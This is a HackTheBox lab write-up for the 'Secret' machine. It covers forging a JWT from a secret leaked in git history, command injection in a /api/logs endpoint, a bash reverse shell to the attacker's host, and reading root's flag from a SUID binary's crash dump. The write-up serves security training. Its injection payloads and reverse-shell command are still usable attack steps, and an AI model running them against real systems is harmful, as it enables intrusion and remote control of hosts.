# Secret - HackTheBox - Writeup
Linux, 20 Base Points, Easy

![info.JPG](images/info.JPG)

## Machine

![‏‏Secret.JPG](images/Secret.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80``` and ```3000```.

***User***: By downloading the portal source code we found a path ```/priv``` API with permission only for user ```theadmin```, we also find a way to create a new user name using ```/api/user/register``` API on port ```3000```, After sucessfully login to the portal we found a header ```auth-token``` with JWT token, By observing the source code we found a file ```auth.js``` which contains the JWT key, On the mail folder we found also ```.git``` folder, by revert to specific commit we found the removed JWT key on ```.env``` file, Using the JWT key we create a ```auth-token``` of ```theadmin``` user to login as ```theadmin``` user, Using the ```theadmin``` token we can access to ```/priv``` API which implemented on ```private.js``` file, Found RCE on ```/api/logs?file``` path, using that we get a reverse shell as ```dasith``` user.

***Root***: On ```/opt/``` directory we found file ```code.c``` which is the source code of ```/opt/count``` binary, On the code we see ```prctl(PR_SET_DUMPABLE)``` which related to ```CVE-2020-10768```, The manipulation with an unknown input leads to an information disclosure vulnerability, Run the ```/opt/count``` binary, insert an input which leads to error, read the ```/var/crash``` logs using ```apport-unpack``` tool and we found the root flag.

![pwn.JPG](images/pwn.JPG)


## Secret Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Secret]
└──╼ $ nmap -sV -sC -oA nmap/Secret 10.10.11.120
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-03 23:34 IST
Nmap scan report for 10.10.11.120
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)

At the bottom of the page we can see an option to download the source code:

![source.JPG](images/source.JPG)

By observing the code we can see the following file ```private.js```:
```js
┌─[evyatar@parrot]─[/hackthebox/Secret/files/local-web/routes]
└──╼ $ cat private.js 
const router = require('express').Router();
const verifytoken = require('./verifytoken')
const User = require('../model/user');

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})


router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

router.use(function (req, res, next) {
    res.json({
        message: {

            message: "404 page not found",
            desc: "page you are looking for is not found. "
        }
    })
});


module.exports = router
```

As we can see, If we are ```theadmin``` user we can access to ```/priv``` route.

By using ```gobuster``` we found another page ```/docs```:

![docs.JPG](images/docs.JPG)

So according to the documentation - let's try to create a new user ```theadmin```:
```HTTP
POST /api/user/register HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
If-None-Match: W/"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s"
Cache-Control: max-age=0
Content-Length: 98

  {

	"name": "theadmin ",
	"email": "root1@dasith.works",
	"password": "Kekc8swFgD6zU"
  }
```

By sending that, we get the following response which says this user name exists:
```HTTP
HTTP/1.1 400 Bad Request
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 18
ETag: W/"12-bovfAO8maqeTuF6NiWgD46KUq3k"
Date: Fri, 05 Nov 2021 22:23:47 GMT
Connection: close

Name already Exist
```

Let's create a different user, ```evyatar9```:
```HTTP
POST /api/user/register HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
If-None-Match: W/"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s"
Cache-Control: max-age=0
Content-Length: 98

  {
	"name": "evyatar9",
	"email": "evyatar9@dasith.works",
	"password": "Kekc8swFgD6zU"
  }
```

And we get the response:
```HTTP
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 19
ETag: W/"13-ON/q6WjFxg6sZBa2XbNhiIbzTmw"
Date: Fri, 05 Nov 2021 22:25:20 GMT
Connection: close


{"user":"evyatar9"}
```

Let's login:
```HTTP
POST /api/user/login HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
If-None-Match: W/"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s"
Cache-Control: max-age=0
Content-Length: 79

  {
	"email": "evyatar9@dasith.works",
	"password": "Kekc8swFgD6zU"
  }
```

Response:
```HTTP
HTTP/1.1 200 OK
X-Powered-By: Express
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTg1YWY1MGYwMDcwYTA0NWVmYWJkYTkiLCJuYW1lIjoiZXZ5YXRhcjkiLCJlbWFpbCI6ImV2eWF0YXI5QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE1MTE5Mn0.fM1SWW9DoWSuGxqjCYhkd-B74e6UiL9-MXOYLrWDPZE
Content-Type: text/html; charset=utf-8
Content-Length: 216
ETag: W/"d8-+oeiUhy1ZBApQLkhGDlTPKjlWq8"
Date: Fri, 05 Nov 2021 22:26:32 GMT
Connection: close

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTg1YWY1MGYwMDcwYTA0NWVmYWJkYTkiLCJuYW1lIjoiZXZ5YXRhcjkiLCJlbWFpbCI6ImV2eWF0YXI5QGRhc2l0aC53b3JrcyIsImlhdCI6MTYzNjE1MTE5Mn0.fM1SWW9DoWSuGxqjCYhkd-B74e6UiL9-MXOYLrWDPZE

```

By decoding the JWT token (Base64 decode), We get the following:
```json
{"alg":"HS256","typ":"JWT"}.{"_id":"6185af50f0070a045efabda9","name":"evyatar9","email":"evyatar9@dasith.works","iat":163615119Mn0.|ÍRYoC¡d®£	dd-¾éH9-1s.µPZE
```

We need to sign a new JWT token with ```theadmin``` as the user name, To do so, we need the JWT signing key.

By observing the code we can see the following file ```auth.js```:
```js
┌─[evyatar@parrot]─[/hackthebox/Secret/files/local-web/routes]
└──╼ $ cat auth.js
const router = require('express').Router();
const User = require('../model/user');
const bcrypt = require('bcryptjs')
const jwt = require('jsonwebtoken')
const { registerValidation, loginValidation} = require('../validations')

router.post('/register', async (req, res) => {

    // validation
    const { error } = registerValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if user exists
    const emailExist = await User.findOne({email:req.body.email})
    if (emailExist) return res.status(400).send('Email already Exist')

    // check if user name exist 
    const unameexist = await User.findOne({ name: req.body.name })
    if (unameexist) return res.status(400).send('Name already Exist')

    //hash the password
    const salt = await bcrypt.genSalt(10);
    const hashPaswrod = await bcrypt.hash(req.body.password, salt)


    //create a user 
    const user = new User({
        name: req.body.name,
        email: req.body.email,
        password:hashPaswrod
    });

    try{
        const saveduser = await user.save();
        res.send({ user: user.name})
    
    }
    catch(err){
        console.log(err)
    }

});


// login 

router.post('/login', async  (req , res) => {

    const { error } = loginValidation(req.body)
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');


    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);

})

router.use(function (req, res, next) {
    res.json({
        message: {

            message: "404 page not found",
            desc: "page you are looking for is not found. "
        }
    })
});

module.exports = router
```

As we can see the JWT signing key is located on ```process.env.TOKEN_SECRET```.

On main directory we can see the following hidden file/dir ```.env``` and ```.git```:
```console
┌─[evyatar@parrot]─[/hackthebox/Secret/files/local-web/]
└──╼ $ ls -a
.  ..  .env  .git  index.js  model  node_modules  package.json  package-lock.json  public  routes  src  validations.js
┌─[evyatar@parrot]─[/hackthebox/Secret/files/local-web/routes]
└──╼ $ cat .env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

So if we have ```.git``` directory we can see the commits etc by ```git log```:
```console
┌─[evyatar@parrot]─[/hackthebox/Secret/files/local-web/routes]
└──╼ $ git log
commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

commit de0a46b5107a2f4d26e348303e76d85ae4870934
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:29:19 2021 +0530

    added /downloads

commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:27:35 2021 +0530

    removed swap

```

So let's checkout one commit before the commit which remove the ```.env``` file which is ```de0a46b5107a2f4d26e348303e76d85ae4870934``` using ```git checkout```:

```console
┌─[evyatar@parrot]─[/hackthebox/Secret/files/local-web/routes]
└──╼ $ git checkout de0a46b5107a2f4d26e348303e76d85ae4870934 --force
Updating files: 100% (3810/3810), done.
Note: switching to 'de0a46b5107a2f4d26e348303e76d85ae4870934'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at de0a46b added /downloads

```

Now let's observe again the ```.env``` file:
```console
┌─[evyatar@parrot]─[/hackthebox/Secret/files/local-web/]
└──╼ $ cat .env 
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

Now, we can sign a new JWT token as ```theadmin``` user to access to ```/priv``` page.

Let's do it using [https://token.dev/](https://token.dev/):

![jwtsign.JPG](images/jwtsign.JPG)

Now, using the new JWT token let's browse to ```/priv``` web page:
```HTTP
GET /api/priv HTTP/1.1
Host: 10.10.11.120:3000
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.52W5mGLsIO2iiLpy3f1VkVavP4hOoWHxy5_0BDn9UKo
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s"
Cache-Control: max-age=0
Content-Length: 0
```

Response:
```HTTP
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 76
ETag: W/"4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0"
Date: Fri, 05 Nov 2021 22:37:14 GMT
Connection: close

{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

Now, By observing again on ```private.js``` file we can see:
```js
...
router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
...

```

As we can see, ```exec``` function will run the command ```git log --oneline ${file}``` where ```${file}``` It's our query input from [req.query.file](https://stackoverflow.com/questions/14417592/node-js-difference-between-req-query-and-req-params), We can use it to get RCE as follow:
```console
GET /api/logs?file=|id HTTP/1.1
Host: 10.10.11.120:3000
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5LCJxdWVyeSI6eyJmaWxlIjoieCJ9fQ.8JngEmTWtD2-rsDZJl28J3aHVjolc0QBVTaZXynBO94
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
If-None-Match: W/"5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s"
Cache-Control: max-age=0
Content-Length: 0

```

We inject the command ```id```  and we get as a response:
```HTTP
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 57
ETag: W/"39-VF02BgsBedBH1NKlFQLF8bJ40W8"
Date: Fri, 05 Nov 2021 22:57:20 GMT
Connection: close

"uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

So we have RCE.

By running the command ```whoami``` using ```GET /api/logs?file=|whoami``` We get ```dasith```.

Let's write a bash file to get a reverse shell using ```GET /api/logs?file=|echo+"bash+-i+>%26+/dev/tcp/10.10.14.14/4243+0>%261"+>+rev.sh ```.

Listen to port ```4243``` using ```nc```:
```console
┌─[evyatar@parrot]─[/hackthebox/Secret/]
└──╼ $ nc -lvp 4243
listening on [any] 4243 ...

```

And execute the file using ```GET /api/logs?file=|bash+rev.sh ```:
```console
┌─[evyatar@parrot]─[/hackthebox/Secret/]
└──╼ $ nc -lvp 4243
listening on [any] 4243 ...
10.10.11.120: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.120] 39056
bash: cannot set terminal process group (1118): Inappropriate ioctl for device
bash: no job control in this shell
dasith@secret:~/local-web$ cat ../user.txt
cat ../user.txt
38aa77b31e3ac206d397ba1430cdd47f
```

And we get the user flag ```38aa77b31e3ac206d397ba1430cdd47f```.

### Root

By enumerating we found a file with SUID on ```/opt``` directory:
```console
dasith@secret:/opt$ ls -ltr
ls -ltr
total 32
-rw-r--r-- 1 root root  3736 Oct  7 10:01 code.c
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 count
-rw-r--r-- 1 root root  4622 Oct  7 10:04 valgrind.log
```

Let's observe the source code ```code.c```:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

The binary ```count``` reads a file into the memory allocated for that process, In the source ```code.c``` file, the function ```prctl(PR_SET_DUMPABLE)``` makes it so the memory can be dumped, if the process receives a signal that tells it to do dump.

The ```count``` binary has SUID so it will run as root which allows ```count``` to read files like ```root.txt``` or ```etc/shadow``` etc.

Most of the time if we crash the process is most of the time is saved in ```/var/crash``` the crash log in the Linux distro.

We can see on the ```main``` function call to [prctl](https://man7.org/linux/man-pages/man2/prctl.2.html) function.

We can see also the [CVE-2020-10768](https://vuldb.com/?id.161290) related to this function.
The manipulation with an unknown input leads to an information disclosure vulnerability.

Let's run the ```count``` binary and save the report to ```/root/root.txt``` (where we have no permission to read this file), Then we need to look at the logs on ```/var/crash```.

Set the state of the "dumpable" attribute, which determines whether core dumps are produced for the calling process upon delivery of a signal whose default behavior is  to
produce a core dump.

```console
dasith@secret:/opt$ ./count -p
./count -p
/root/root.txt
y
/root/root.txt
Enter source file/directory name: 
Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: Path: Could not open /root/root.txt for writing
```

Now, If we are looking at ```/var/crash``` directory we can see the following files:
```console
dasith@secret:/var/crash$ ls -ltr
ls -ltr
total 80
-rw-r----- 1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
-rw-r----- 1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r----- 1 dasith dasith 28081 Nov  6 16:29 _opt_count.1000.crash
```

By printing the file ```_opt_count.1000.crash``` we can see:
```console
dasith@secret:/var/crash$ cat _opt_count.1000.crash
cat _opt_count.1000.crash
ProblemType: Crash
Architecture: amd64
Date: Sat Nov  6 16:29:26 2021
DistroRelease: Ubuntu 20.04
ExecutablePath: /opt/count
ExecutableTimestamp: 1633601037
ProcCmdline: ./count
ProcCwd: /opt
ProcEnviron:
 SHELL=/bin/sh
 LANG=en_US.UTF-8
 TERM=xterm
 PATH=(custom, no user)
ProcMaps:
 55ef26639000-55ef2663a000 r--p 00000000 fd:00 393236                     /opt/count
 55ef2663a000-55ef2663b000 r-xp 00001000 fd:00 393236                     /opt/count
 55ef2663b000-55ef2663c000 r--p 00002000 fd:00 393236                     /opt/count
 55ef2663c000-55ef2663d000 r--p 00002000 fd:00 393236                     /opt/count
 55ef2663d000-55ef2663e000 rw-p 00003000 fd:00 393236                     /opt/count
 55ef26fa5000-55ef26fc6000 rw-p 00000000 00:00 0                          [heap]
 7f9e23398000-7f9e233bd000 r--p 00000000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f9e233bd000-7f9e23535000 r-xp 00025000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f9e23535000-7f9e2357f000 r--p 0019d000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f9e2357f000-7f9e23580000 ---p 001e7000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f9e23580000-7f9e23583000 r--p 001e7000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f9e23583000-7f9e23586000 rw-p 001ea000 fd:00 55911                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
 7f9e23586000-7f9e2358c000 rw-p 00000000 00:00 0 
 7f9e23595000-7f9e23596000 r--p 00000000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f9e23596000-7f9e235b9000 r-xp 00001000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f9e235b9000-7f9e235c1000 r--p 00024000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f9e235c2000-7f9e235c3000 r--p 0002c000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f9e235c3000-7f9e235c4000 rw-p 0002d000 fd:00 55880                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
 7f9e235c4000-7f9e235c5000 rw-p 00000000 00:00 0 
 7fffcda45000-7fffcda66000 rw-p 00000000 00:00 0                          [stack]
 7fffcdaf3000-7fffcdaf6000 r--p 00000000 00:00 0                          [vvar]
 7fffcdaf6000-7fffcdaf7000 r-xp 00000000 00:00 0                          [vdso]
 ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
ProcStatus:
 Name:	count
 Umask:	0022
 State:	S (sleeping)
 Tgid:	1742
 Ngid:	0
 Pid:	1742
 PPid:	1227
 TracerPid:	0
 Uid:	1000	1000	1000	1000
 Gid:	1000	1000	1000	1000
 FDSize:	256
 Groups:	1000 
 NStgid:	1742
 NSpid:	1742
 NSpgid:	1742
 NSsid:	1227
 VmPeak:	    2488 kB
 VmSize:	    2488 kB
 VmLck:	       0 kB
 VmPin:	       0 kB
 VmHWM:	     588 kB
 VmRSS:	     588 kB
 RssAnon:	      64 kB
 RssFile:	     524 kB
 RssShmem:	       0 kB
 VmData:	     180 kB
 VmStk:	     132 kB
 VmExe:	       8 kB
 VmLib:	    1644 kB
 VmPTE:	      40 kB
 VmSwap:	       0 kB
 HugetlbPages:	       0 kB
 CoreDumping:	1
 THP_enabled:	1
 Threads:	1
 SigQ:	0/15392
 SigPnd:	0000000000000000
 ShdPnd:	0000000000000000
 SigBlk:	0000000000000000
 SigIgn:	0000000001001000
 SigCgt:	0000000000000000
 CapInh:	0000000000000000
 CapPrm:	0000000000000000
 CapEff:	0000000000000000
 CapBnd:	0000003fffffffff
 CapAmb:	0000000000000000
 NoNewPrivs:	0
 Seccomp:	0
 Speculation_Store_Bypass:	thread vulnerable
 Cpus_allowed:	1
 Cpus_allowed_list:	0
 Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001
 Mems_allowed_list:	0
 voluntary_ctxt_switches:	5
 nonvoluntary_ctxt_switches:	11
Signal: 11
Uname: Linux 5.4.0-89-generic x86_64
UserGroups: N/A
CoreDump: base64
 H4sICAAAAAAC/0NvcmVEdW1wAA==
 7Z0JYFTF/cffJgECckS5gqgsChZBwgIREiCwAQIbDbBAwHBodkk2JJKL3Q2EassqoERE400913rhHVtt0Xqs1bbYekRtFbX/NloPPKqpB+KZ/292vpO8N9kNCaJt7e8DL983v/n9ZubNmzfv7dvdtxtz8uYk2GyGIsmYbrSlDMNptMdpZBiprf6SULcYjkRj79h2m4q1w1BfdPyHS0wOKbFVxEWrcsAe1uLixLfWp+IaDjIu0vl2dhcrTtgbuxjnht39hRaXoKnWTg/soczjrtsYoz53+7hof1bD3jjVGqcIDY5dn4pzL44dF05qF2eY45pPjR0Xbz+oOKPAGufQVO/PMOIcXYxrRJxHi/No2m68JEqDe1ns/RBvXDsR51kWu18ccfa7iqtfEWf/xWmnirOv7HQ75fhEnKOLcR7EObsYV63686anWyxxBzge1MTkuMca18F+j0Y0IM6jxXXQzujYjqiJ0NMiOFCc8HbbZOysBYtyhO0wU3XmdcUz1CF/SmrTeIT7xc8zk7xUju3SPohzyXR4DjRfaihT6hx0NW1etGf2tbRYR9w30U1vmXnxyXIfo40NS7+IOecqv4lIq/K3Dr8l2vdjYHfeXxB7bMdBzTWij7fSIkaQ6mNjETJ7OKOyN1Euet8WVdVUBk1lpo2LWuydb0XHiLaFaMmdm7s41v4XTOom2/Z9IdrktMnjTrVpuMrE8aCGccuX23oI7a7ykXE4ksVQ1XwnzvNq2GaY6hRgCBo9VHmYP5O1NvaE2m+U5ak+U/2kX3b00fL7ammc3VrHzBBo7gw5Bo/UyhsGbS6U+epQWwZ/HbF9Z1BdOXm5c1Sfqj5sXVHXQPo1jUrjmqX1HKquYXBNos6MrdcojZpdXYM0SW0dUupaQT/3qzTO7SOVXZ3rce6+VjWo9Vwuj9O3WxuK49ah2dW5GOfWd5VdnTP1c6BK4xzXWrw656XIc8oIZVfnNJyjTlR2dc7COWgszOOqqoPy8O7aak3AP668bNW42oxJhZPSx5aXVdbUjl1dWSOMRWMnpE0cnxao+oG7Ff9HO2F+SZDHgjr+NsaZU0PDxLktIXbm94g6XyoVc2D0cmW0eY5pMdRlRmSUde4Zp6GXb79ZHnfxTi1ub7B0it3w0uqsqpry4jhu/7WIc5a4/E2gXZ2XO39JgcFj4oc2Jnoc2MXCv38PMwzDMAzDMAzDMMyhZ6P2/n8i3v+395dpJ+xNWW0x4v3/PvR3mHFM9B5KkslP1z0JVlX38RMRl4obDboeZVjVZtIO3vIy7IdZtd37enHeh7v3MKu2ex/Rriqw6o5Eq+rvWybj5nJylqbwT9HiEhCXirjULKs226yq+jMJSwbK01Vvvh5XAD9dZxtWVX2/+M1g8cHU50bcLryhpKu6oaRU1beQ4lrfY+oEavcuQn3x9sP+BKuqcSZuKU9KF/eQ5Q3l2oxJYyelpwWq0ia0tkvUIcbU3PlLxH6LCJvanWJ9ANIi37vip0dMznvu0uHeW257+dbJt0w7s+kqVYYNPgb8zfegxPpRhul9cOPs6F91XDzne6aio35YSssRMexZcez7jbZ9ZubHcfw3xrGfG8deHMf+bBx7Thz7hXHskTj2R+LYN8SxXx7Hfnoc+8g49jvj2NfGsQ+wxe7/NXH8/xDHPjiOfVgce1oc+xFx7MfFaedhcfyvpeXYGHZDvMEkDqtJRsAXrCkrNny1ZUHD7/MWF5f5jZKqal+lUVReFfCJZGFhWaCqKDOzMFDkrSwxAkF/ZVH1BjIHgt6iNYVFpWsKS7xl5UZ1TbCo1Evhq33BIuFWTqVU+4uC5YawRLPIJ2CURIs2RC2i/NWyCdFyvUEqt6jWW1h